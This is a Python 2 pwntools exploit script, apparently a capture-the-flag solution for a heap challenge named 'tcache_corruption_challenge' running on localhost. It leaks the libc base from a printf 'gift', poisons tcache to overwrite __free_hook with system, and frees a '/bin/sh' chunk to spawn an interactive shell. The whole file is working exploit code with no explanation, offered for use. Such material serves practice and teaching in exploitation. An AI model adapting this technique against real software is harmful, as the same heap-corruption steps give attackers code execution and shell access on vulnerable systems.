#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)
    
# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''
    
#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './tcache_corruption_challenge'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols.so'})
# sh = process(execve_file)
sh = remote('localhost', 10001)
elf = ELF(execve_file)
libc = ELF('./libc-2.29.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def add(time, size, content):
    sh.sendlineafter('Your choice: ', '1')
    sh.sendlineafter('Time: ', str(time))
    sh.sendlineafter('Message size: ', str(size))
    sh.sendafter('Message: ', content)

def run():
    sh.sendlineafter('Your choice: ', '2')

sh.recvuntil('Gift: ')
libc_addr = int(sh.recvline(), 16) - libc.symbols['printf']
success('libc_addr: ' + hex(libc_addr))
add(2000000, 0x68, 'aaaa')
run()
run()
sleep(6)
add(0, 0x248, '\0' * 0x40 + p64(0) * 5 + p64(libc_addr + libc.symbols['__free_hook'] - 8))
add(0, 0x68, '/bin/sh\0' + p64(libc_addr + libc.symbols['system']))
run()
sleep(1)
sh.sendline('3')


sh.interactive()
clear()